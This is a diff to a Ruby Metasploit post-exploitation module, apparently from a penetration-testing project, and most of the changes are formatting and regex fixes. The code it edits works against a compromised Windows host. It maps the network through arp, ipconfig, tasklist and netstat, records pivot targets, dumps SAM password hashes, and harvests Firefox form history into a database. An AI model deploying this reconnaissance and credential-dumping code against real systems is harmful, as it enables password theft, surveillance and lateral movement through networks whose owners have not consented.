@@ -1,15 +1,11 @@
-require 'pp'
-
 module FIDIUS
   class MsfWorker
     class Reconnaissance
-      #dmke:
-      # * REGEXP_IP match auch auf 999.999.999.999
-      # * REGEXP_MAC würde auch "xj-z-?.-@3-..." matchen "\S = nicht Whitespace"
-      REGEXP_IP = /\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/
-      REGEXP_MAC = /\S{1,2}\-\S{1,2}\-\S{1,2}\-\S{1,2}\-\S{1,2}\-\S{1,2}/
+      REGEXP_IP  = /\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b/
+      REGEXP_MAC = /\b([0-9A-Fa-f]{2}[:-]){5}[0-9A-Fa-f]{2}\b/ # still matches times: 00-00-00-00:00:00
 
-      def initialize
+      def initialize client
+        @client = client
         @ownedHost = nil
         run_all
       end
@@ -50,16 +46,17 @@ module FIDIUS
         hostMac = exec_dos_cmd('ipconfig /all')[/#{REGEXP_MAC}.*#{hostIp}/m][/#{REGEXP_MAC}/].strip
         
         sysinfo = client.sys.config.sysinfo
-        host = { :workspace => session.framework.db.workspace, 
-                 :host      => hostIp,
-                 :mac       => hostMac,
-                 :name      => sysinfo['Computer'],
-                 :arch      => sysinfo['Architecture'],
-                 :os_lang   => sysinfo['System Language'],
-                 :os_name   => sysinfo['OS'][/(\s+|\w|,)+/].strip,
-                 :os_flavor =>  sysinfo['OS'] =~ /.*\(.*\).*/ ? sysinfo['OS'][/\(.+\)/][/(\w|\s)+/] : "",
-                 :os_sp     => sysinfo['OS'] =~ /.*\(.*Service Pack.*\).*/ ? sysinfo['OS'][/\(.+\)/][/(\w|\s|,)+/].split(",")[1].strip : ""
-               }
+        host = {
+          :workspace => session.framework.db.workspace, 
+          :host      => hostIp,
+          :mac       => hostMac,
+          :name      => sysinfo['Computer'],
+          :arch      => sysinfo['Architecture'],
+          :os_lang   => sysinfo['System Language'],
+          :os_name   => sysinfo['OS'][/(\s+|\w|,)+/].strip,
+          :os_flavor => sysinfo['OS'] =~ /.*\(.*\).*/ ? sysinfo['OS'][/\(.+\)/][/(\w|\s)+/] : "",
+          :os_sp     => sysinfo['OS'] =~ /.*\(.*Service Pack.*\).*/ ? sysinfo['OS'][/\(.+\)/][/(\w|\s|,)+/].split(",")[1].strip : ""
+        }
         @ownedHost = session.framework.db.get_host(host)  
         write_db host
       end
@@ -69,11 +66,12 @@ module FIDIUS
         cmdout = exec_dos_cmd 'arp -a'
         relLines = cmdout.grep /.*#{REGEXP_IP}.*#{REGEXP_MAC}.*/
         relLines.each do |line|
-          host = { :workspace     => session.framework.db.workspace, # TODO: do i need this 
-                   :host          => line[/#{REGEXP_IP}/],
-                   :mac           => line[/#{REGEXP_MAC}/],
-                   :pivot_host_id => @ownedHost[:id] 
-                 }
+          host = {
+            :workspace     => session.framework.db.workspace, # TODO: do i need this 
+            :host          => line[/#{REGEXP_IP}/],
+            :mac           => line[/#{REGEXP_MAC}/],
+            :pivot_host_id => @ownedHost[:id] 
+          }
           write_db host
         end
       end
@@ -110,18 +108,20 @@ module FIDIUS
             end
           end
           
-          HostInterface.new({ :host_id=>@ownedHost[:id],
-                              :name=>name.strip.gsub(":", ""),
-                              :dns_suffix=>values[0],
-                              :description=>values[1],                 
-                              :mac=>values[2],
-                              :DHCPActive=> values[3] =~ /Ja|Yes|yes|/ ? true : false,
-                              :AutoconfigActive=>values[4] =~ /Ja|Yes|yes|/ ? true : false,
-                              :address=> values.size >= 6 ? values[5] : "",
-                              :subnetmask=> values.size >= 7 ? values[6]  : "",
-                              :defGateway => values.size >= 8 ? values[7] : "",
-                              :DHCPServer => values.size >= 9 ? values[8] : "",
-                              :DNSServer => values.size >= 10 ? values[9] : ""}).save
+          HostInterface.new({
+            :host_id          => @ownedHost[:id],
+            :name             => name.strip.gsub(":", ""),
+            :dns_suffix       => values[0],
+            :description      => values[1],                 
+            :mac              => values[2],
+            :DHCPActive       => values[3] =~ /Ja|Yes|yes|/ ? true : false,
+            :AutoconfigActive => values[4] =~ /Ja|Yes|yes|/ ? true : false,
+            :address          => values.size >= 6 ? values[5] : "",
+            :subnetmask       => values.size >= 7 ? values[6] : "",
+            :defGateway       => values.size >= 8 ? values[7] : "",
+            :DHCPServer       => values.size >= 9 ? values[8] : "",
+            :DNSServer        => values.size >= 10 ? values[9] : ""}
+          ).save
           i += 1
         end
       end
@@ -143,20 +143,32 @@ module FIDIUS
           lineArray = lines[i].split
           if lineArray[1].to_i != 0
             actPid = lineArray[1]
-            HostTasklist.new(:host_id=>@ownedHost[:id],:name=>lineArray[0],:pid=>actPid).save
+            HostTasklist.new(
+              :host_id => @ownedHost[:id],
+              :name => lineArray[0],
+              :pid => actPid
+            ).save
             y = 2
             while y < lineArray.size 
               service = ''
               if lineArray[y].start_with? "Nicht" #TODO...just works in the german-windows-versions
                 break
               end
-              HostTaskService.new(:host_id=>@ownedHost[:id],:pid=>actPid,:service=>lineArray[y].gsub(/,/,"")).save
+              HostTaskService.new(
+                :host_id => @ownedHost[:id],
+                :pid => actPid,
+                :service => lineArray[y].gsub(/,/, "")
+              ).save
               y += 1
             end
           else
             services = lines[i].split
             services.each do |service|
-              HostTaskService.new(:host_id=>@ownedHost[:id],:pid=>actPid,:service=>service.gsub(/,/,"")).save
+              HostTaskService.new(
+                :host_id => @ownedHost[:id],
+                :pid => actPid,
+                :service => service.gsub(/,/, "")
+              ).save
             end
           end
         end
@@ -187,14 +199,23 @@ module FIDIUS
             else
               status = lineArray[3]
             end
-            HostActiveConnection.new(:host_id=>@ownedHost[:id],:protocol=>lineArray[0],
-                                     :local_address=>lineArray[1],:remote_address=>lineArray[2],
-                                     :status=>status,:pid=>lineArray[4]).save
+            HostActiveConnection.new(
+              :host_id        => @ownedHost[:id],
+              :protocol       => lineArray[0],
+              :local_address  => lineArray[1],
+              :remote_address => lineArray[2],
+              :status         => status,
+              :pid            => lineArray[4]
+            ).save
           end
           if lineArray.size == 4
-            HostActiveConnection.new(:host_id=>@ownedHost[:id],:protocol=>lineArray[0],
-                                     :local_address=>lineArray[1], :remote_address=>lineArray[2], 
-                                     :pid=>lineArray[3]).save
+            HostActiveConnection.new(
+              :host_id        => @ownedHost[:id],
+              :protocol       => lineArray[0],
+              :local_address  => lineArray[1],
+              :remote_address => lineArray[2], 
+              :pid            => lineArray[3]
+            ).save
           end
           i += 1
         end
@@ -209,11 +230,14 @@ module FIDIUS
           @client.core.use("priv")
           hashes = @client.priv.sam_hashes
           hashes.each do |h|
-            HashDump.new(:host_id=>@ownedHost[:id],:hash_key=>h.to_s()).save
+            HashDump.new(
+              :host_id  => @ownedHost[:id],
+              :hash_key => h.to_s
+            ).save
           end
         rescue ::Exception => e
-          puts("\tError dumping hashes: #{e.class} #{e}")
-          puts("\tPayload may be running with insufficient privileges!")
+          puts "\tError dumping hashes: #{e.class} #{e}"
+          puts "\tPayload may be running with insufficient privileges!"
         end
       end
 
@@ -255,7 +279,11 @@ module FIDIUS
         File.open(frfxLogDir + "/main_form_history.txt") do |file|
           file.each do |line|
             lineArray = line.split
-            FrfxForm.new(:host_id=>@ownedHost[:id],:form_name=>lineArray[1],:value=>lineArray[3]).save # insert into ...
+            FrfxForm.new(
+              :host_id   => @ownedHost[:id],
+              :form_name => lineArray[1],
+              :value     => lineArray[3]
+            ).save # insert into ...
           end
         end
         #if clear 
@@ -266,4 +294,4 @@ module FIDIUS
   end
 end
 
-FIDIUS::MsfWorker::Reconnaissance.new
+FIDIUS::MsfWorker::Reconnaissance.new client
